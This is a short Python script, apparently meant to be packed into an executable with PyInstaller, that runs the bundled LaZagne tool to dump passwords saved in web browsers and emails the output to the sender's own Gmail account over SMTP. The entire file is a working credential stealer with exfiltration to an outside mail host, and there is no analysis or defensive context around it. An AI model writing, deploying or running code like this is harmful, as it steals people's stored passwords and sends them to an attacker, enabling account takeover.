import subprocess
import smtplib
import re
import sys

def send_mail(email, password, message):
	server = smtplib.SMTP('smtp.gmail.com', 587)
	server.starttls()
	server.login(email, password)
	server.sendmail(email, email, message)
	server.quit()

command = f'{sys._MEIPASS}\\laZagne\\laZagne.exe browsers'
message = subprocess.check_output(command, shell=True)
send_mail('', '', message)
